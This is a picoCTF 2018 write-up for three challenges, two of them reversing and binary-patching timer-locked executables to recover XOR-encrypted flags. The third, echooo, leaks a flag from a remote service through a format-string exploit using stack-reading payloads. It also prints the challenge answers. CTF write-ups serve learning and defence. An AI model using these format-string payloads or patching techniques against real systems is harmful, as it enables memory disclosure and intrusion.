# [be-quick-or-be-dead-2](https://2018game.picoctf.com/problems)

## Problem
As you enjoy this [music](https://www.youtube.com/watch?v=CTt1vk9nM9c) even more, another executable [be-quick-or-be-dead-2](https://2018shell3.picoctf.com/static/fecde258147ce824e3e7524e79c1100d/be-quick-or-be-dead-2) shows up. Can you run this fast enough too? You can also find the executable in /problems/be-quick-or-be-dead-2_2_7e92e9cc48bad623da1c215c192bc919.

## Solution
```
——> ./be-quick-or-be-dead-2
Be Quick Or Be Dead 2
=====================

Calculating key...
You need a faster machine. Bye bye.
```

okay same thing as be-quick-or-be-dead-1, let's see if i can solve it the same way, by putting a high value for the timer

with `ltrace ./be-quick-or-be-dead-2` we can see the timer is set with `alarm(3)`, so let's geedeebee

setting the breakpoint on alarm we can see on the backtrace where it's called
```
Breakpoint 1, 0x00007ffff7e9c4d0 in alarm () from /usr/lib/libc.so.6
gdb-peda$ bt
#0  0x00007ffff7e9c4d0 in alarm () from /usr/lib/libc.so.6
#1  0x00000000004007cb in set_timer ()
#2  0x0000000000400882 in main ()
#3  0x00007ffff7df8223 in __libc_start_main () from /usr/lib/libc.so.6
#4  0x00000000004005c9 in _start ()
```

```
Dump of assembler code for function set_timer:
   0x000000000040077a <+0>:	push   rbp
   [..]
   0x00000000004007c1 <+71>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004007c4 <+74>:	mov    edi,eax
   0x00000000004007c6 <+76>:	call   0x400550 <alarm@plt>
   0x00000000004007cb <+81>:	nop
   0x00000000004007cc <+82>:	leave  
   0x00000000004007cd <+83>:	ret    
End of assembler dump.
```

and breaking before the call we can change the timer value from 3 to 9999

```
Breakpoint 2, 0x00000000004007c6 in set_timer ()
gdb-peda$ p $rax
$4 = 0x3
gdb-peda$ set $rax=9999
gdb-peda$ c
Continuing.
Calculating key...

Program received signal SIGALRM, Alarm clock.
```

but it doesn't work. the program doesn't stop, but it keeps calculating for a looong time for a fibonacci function fib(). we can see that in gdb with ```bt```.

```
gdb-peda$ disas 0x0000000000400759
Dump of assembler code for function calculate_key:
   0x000000000040074b <+0>:	push   rbp
   0x000000000040074c <+1>:	mov    rbp,rsp
   0x000000000040074f <+4>:	mov    edi,0x402
   0x0000000000400754 <+9>:	call   0x400706 <fib>
   0x0000000000400759 <+14>:	pop    rbp
   0x000000000040075a <+15>:	ret    
End of assembler dump.
```

and fib(0x402) is a number with 215 digits in base 10. we gotta find another way. lets's have a closer look at what the program does.
using radare2 we see the main structure is header()->set_timer()->get_key()->print_flag()

```
[0x004005a0]> s main
[0x0040085f]> pdf
            ;-- main:
/ (fcn) sym.main 62
|   sym.main (int argc, char **argv, char **envp);
|           ; var char **local_10h @ rbp-0x10
|           ; var int local_4h @ rbp-0x4
|           ; arg int argc @ rdi
|           ; arg char **argv @ rsi
|           ; DATA XREF from entry0 (0x4005bd)
|           0x0040085f      55             push rbp
|           0x00400860      4889e5         mov rbp, rsp
|           0x00400863      4883ec10       sub rsp, 0x10
|           0x00400867      897dfc         mov dword [local_4h], edi   ; argc
|           0x0040086a      488975f0       mov qword [local_10h], rsi  ; argv
|           0x0040086e      b800000000     mov eax, 0
|           0x00400873      e8a9ffffff     call sym.header
|           0x00400878      b800000000     mov eax, 0
|           0x0040087d      e8f8feffff     call sym.set_timer
|           0x00400882      b800000000     mov eax, 0
|           0x00400887      e842ffffff     call sym.get_key
|           0x0040088c      b800000000     mov eax, 0
|           0x00400891      e863ffffff     call sym.print_flag
|           0x00400896      b800000000     mov eax, 0
|           0x0040089b      c9             leave
\           0x0040089c      c3             ret
```

inspecting more we come across the function decrypt_flag() inside print_flag(). this is its pseudo C code:

```
__int64 result; // rax
  int argv1_; // [rsp+0h] [rbp-14h]
  unsigned int i; // [rsp+10h] [rbp-4h]

  argv1_ = argv1;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i > 0x38 )
      break;
    flag[i] ^= *((_BYTE *)&argv1_ + (signed int)i % 4);
    if ( (signed int)i % 4 == 3 )
      ++argv1_;
  }
  return result;
  ```

so it's a classic XOR between a string stored inside the program and a buffer calculated from argv1.
going back to print_flag() we can see that argv1 actually is the key calculated before by fib(), as r2 identified obj.key

```
|           0x00400802      e829fdffff     sym.imp.puts ()             ; int puts(const char *s)
|           0x00400807      8b05b3082000   eax = dword [obj.key]       ; obj.__TMC_END ; [0x6010c0:4]=0
|           0x0040080d      89c7           edi = eax
|           0x0040080f      e882feffff     sym.decrypt_flag ()
```

having any 2 of the 3 variables in the XOR operation we can get the remaining one. we can access the encoded flag string with radare2

```
[0x004007f9]> s obj.flag
[0x00601080]> px
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00601080  28f2 6998 1acf 4c8c 2ef3 6fa8 3df2 6898  (.i...L...o.=.h.
0x00601090  32fa 6994 34c4 7992 2fee 6f99 3cfe 5594  2.i.4.y./.o.<.U.
0x006010a0  01f5 5595 04c4 6e98 0cfe 5591 02e8 7ea8  ..U...n...U...~.
0x006010b0  53fe 3bcf 5da3 39c3 1b00 0000 0000 0000  S.;.].9.........
```

and we know the flag starts with "picoCTF{", so we can calculate the first 8 bytes of the key with a simple python script

```
bytes = ['0x28','0xf2','0x69','0x98','0x1a','0xcf','0x4c','0x8c']
flag = 'picoCTF{'
l = []

for i in range(0,8):
    l.append(ord(flag[i]) ^ int(bytes[i], 16))

s = '0x'
for e in l[::-1]:
    sn = str(hex(e)).replace('0x', '')
    if len(sn) < 2:
        s += '0'
    s += sn

print(s)
print(str(int(s,16)))
```

that gives us 0xf70a9b59f70a9b58 = 17801211287834368856. let's try to patch it into the program to see if we get at least the first part of the flag right; but first we gotta get rid of the fib()

```
[0x0040085f]> s 0x0040087d
[0x0040087d]> wa call sym.header
Written 5 byte(s) (call sym.header) = wx e89fffffff
[0x0040087d]> s 0x00400887
[0x00400887]> wa call sym.header
Written 5 byte(s) (call sym.header) = wx e895ffffff
[0x00400887]> pdf
            ;-- main:
[..]
|           0x0040086e      b800000000     mov eax, 0
|           0x00400873      e8a9ffffff     call sym.header
|           0x00400878      b800000000     mov eax, 0
|           0x0040087d      e89fffffff     call sym.header
|           0x00400882      b800000000     mov eax, 0
|           0x00400887      e895ffffff     call sym.header
|           0x0040088c      b800000000     mov eax, 0
|           0x00400891      e863ffffff     call sym.print_flag
[..]
```

we can just call header() three times instead of calling set_timer() and get_key().

now, back in gdb we set a breakpoint on print_flag, before the call to decrypt_flag, so we can change the value of the key

```
0x400802 <print_flag+9>:	call   0x400530 <puts@plt>
0x400807 <print_flag+14>:	mov    eax,DWORD PTR [rip+0x2008b3]        # 0x6010c0 <key>
0x40080d <print_flag+20>:	mov    edi,eax
=> 0x40080f <print_flag+22>:	call   0x400696 <decrypt_flag>
0x400814 <print_flag+27>:	mov    edi,0x601080
0x400819 <print_flag+32>:	call   0x400530 <puts@plt>
```

then we set it

```
gdb-peda$ set $edi=0xf70a9b59f70a9b58
gdb-peda$ c
Continuing.
picoCTF{the_fibonacci_sequence_can_be_done_fast_7e188834}
[Inferior 1 (process 20880) exited normally]
```

the 8 byte value was enough for the entire flag decryption


# [be-quick-or-be-dead-3](https://2018game.picoctf.com/problems)

## Problem
As the [song](https://www.youtube.com/watch?v=CTt1vk9nM9c) draws closer to the end, another executable [be-quick-or-be-dead-3](https://2018shell3.picoctf.com/static/1da7d7f7d74df19b7bdb54a3294dd930/be-quick-or-be-dead-3) suddenly pops up. This one requires even faster machines. Can you run it fast enough too? You can also find the executable in /problems/be-quick-or-be-dead-3_0_fa64b8365f5d2ac445b925be0960b943.

## Solution
... there's not much to write after solving be-quick-or-be-dead-2, it can be solved in exactly the same way. Just throw at the python script the new bytes of obj.flag

```
bytes = ['0xd3', '0x11', '0x4f', '0xb8', '0xe7', '0x2c', '0x6a', '0xac']
```

patch the program to jump the calls to set_timer and get_key, run it in gdb and break at the call to decrypt_flag, ```set $rdi=0xd72c78a4d72c78a3```, then continue to have the flag. see solution of be-quick-or-be-dead-2 for deatils.

```
picoCTF{dynamic_pr0gramming_ftw_1ffc009d}
```


# [echooo](https://2018game.picoctf.com/problems)

## Problem
This program prints any input you give it. Can you [leak](https://2018shell3.picoctf.com/static/802110a231267eb07cdead16416dea12/echo) the flag? Connect with nc 2018shell3.picoctf.com 23397. [Source](https://2018shell3.picoctf.com/static/802110a231267eb07cdead16416dea12/echo.c).

## Solution

here's the source code

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;

  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");

  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

let's open the executable locally with gdb and have a look at the stack before the format string gets executed

```
——> gdb echo
Reading symbols from echo...(no debugging symbols found)...done.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080485fb <+0>:	lea    ecx,[esp+0x4]
[..]
0x080486ff <+260>:	call   0x8048490 <exit@plt>
0x08048704 <+265>:	sub    esp,0x4
0x08048707 <+268>:	push   DWORD PTR [ebp-0x90]
0x0804870d <+274>:	push   0x40
0x0804870f <+276>:	lea    eax,[ebp-0x4c]
0x08048712 <+279>:	push   eax
0x08048713 <+280>:	call   0x8048460 <fgets@plt> <-- fgets(flag, sizeof(flag), file);
0x08048718 <+285>:	add    esp,0x10
[..]
0x08048742 <+327>:	add    esp,0x10
0x08048745 <+330>:	sub    esp,0xc
0x08048748 <+333>:	lea    eax,[ebp-0x8c]
0x0804874e <+339>:	push   eax
0x0804874f <+340>:	call   0x8048450 <printf@plt>
0x08048754 <+345>:	add    esp,0x10
0x08048757 <+348>:	jmp    0x804871b <main+288>
End of assembler dump.
gdb-peda$ b *0x0804874f
Breakpoint 1 at 0x804874f
gdb-peda$ r
Starting program: /home/andrei/Documents/pico/echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> AAAABBBB
Breakpoint 1, 0x0804874f in main ()
gdb-peda$
```

looking at the disassembly of main we can also get the address of the ```flag``` variable; the call to the fgets that reads the flag.txt file is at main+280, and just before that the flag buffer is pushed on the stack from eax to pass it as argument. the address is loaded on eax the line before with ```lea    eax,[ebp-0x4c]``` so there's our buffer:

```
gdb-peda$ x/wx $ebp-0x4c
0xffffd8fc:	0x6f636970
```

and here's the stack prior to the printf

```
gdb-peda$ x/64wx $esp
0xffffd890:	0xffffd8bc	0x00000040	0xf7f95580	0x08048647
0xffffd8a0:	0xf7ffc8e4	0xf63d4e2e	0xf7ffdacc	0xffffd9f4
0xffffd8b0:	0xffffd8fc	0x000003e8	0x0804b160	0x41414141
0xffffd8c0:	0x42424242	0x0000000a	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8f0:	0x00000000	0x00000000	0x00000000	0x6f636970
0xffffd900:	0x7b465443	0x6b6e6166	0x7d6f6c75	0xf7f9000a
0xffffd910:	0xf7f94e24	0xf7f94e24	0x00000000	0xf7dedafb
0xffffd920:	0xf7f953bc	0x00040000	0x00000003	0x080487ab
0xffffd930:	0x00000001	0xffffd9f4	0xffffd9fc	0x0fec1a00
0xffffd940:	0xf7fe4150	0xffffd960	0x00000000	0xf7dd6b41
0xffffd950:	0xf7f94e24	0xf7f94e24	0x00000000	0xf7dd6b41
0xffffd960:	0x00000001	0xffffd9f4	0xffffd9fc	0xffffd984
0xffffd970:	0x00000001	0x00000000	0xf7f94e24	0xffffffff
0xffffd980:	0xf7ffcfb4	0x00000000	0xf7f94e24	0xf7f94e24
```

so our input begins at 0xffffd8bc and the flag begins at 0xffffd8fc;
also the flag buf is the 27th word on the stack, we can check that with the format string:

```
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> 0x%27$08x
0x6f636970
```

bingo. now we just need to read the flag. after ```nc```ing on the server we try to read the flag string:

```
——> nc 2018shell3.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %27s
timeout: the monitored command dumped core
```

but that leads to core dump. so we can read the words and translate them to string locally

```
——> nc 2018shell3.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> 0x%27$08x_0x%28$08x_0x%29$08x_0x%30$08x_0x%31$08x_0x%32$08x_
0x6f636970_0x7b465443_0x6d526f66_0x735f7434_0x6e695274_0x615f7347_
```

after we have all the words we can write a C program to read the flag:

```
#include <stdio.h>

int main(void) {

	int s[] = {0x6f636970, 0x7b465443, 0x6d526f66, 0x735f7434,
  			0x6e695274, 0x615f7347, 0x445f6552, 0x65476e61,
  			0x73753072, 0x3435325f, 0x61383431, 0x000a7d65,
  			0x080487ab, 0x00000001, 0x00};

	printf("%s\n", (char *) s);

	return 0;
}
```

```
——> gcc -m32 decode.c -o decode
——> ./decode
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}
```
